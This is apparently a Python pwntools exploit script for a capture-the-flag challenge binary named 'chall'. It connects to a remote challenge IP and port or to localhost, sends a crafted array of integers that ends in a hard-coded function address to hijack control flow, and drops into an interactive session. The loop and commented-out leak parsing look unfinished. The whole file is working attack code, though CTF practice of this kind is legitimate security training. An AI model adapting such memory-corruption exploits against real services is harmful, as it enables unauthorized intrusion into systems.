#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"

rhp1 = {"host":"13.231.207.73","port":9005}
rhp2 = {'host':"localhost",'port':23946}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

addr_calc_sum = 0x00000000040088e
hoge = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,addr_calc_sum]

def exploit(conn):
  n = 22


  conn.recvuntil(" = ")
  conn.sendline(str(n))


  for jx in range(10):
    print("[+] try: "+hex(jx))
    raw_input()
    for ix in range(len(hoge)):
      conn.recvuntil(" = ")
      conn.sendline(str(hoge[ix]))
    print(conn.recvline())
    #conn.recvuntil("SUM = ")
    #data = 0xffffffffffffffff - int(conn.recvline().rstrip()[1:])
    #print(data)
    #print("[*]SUM: "+hex(int(data)))

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

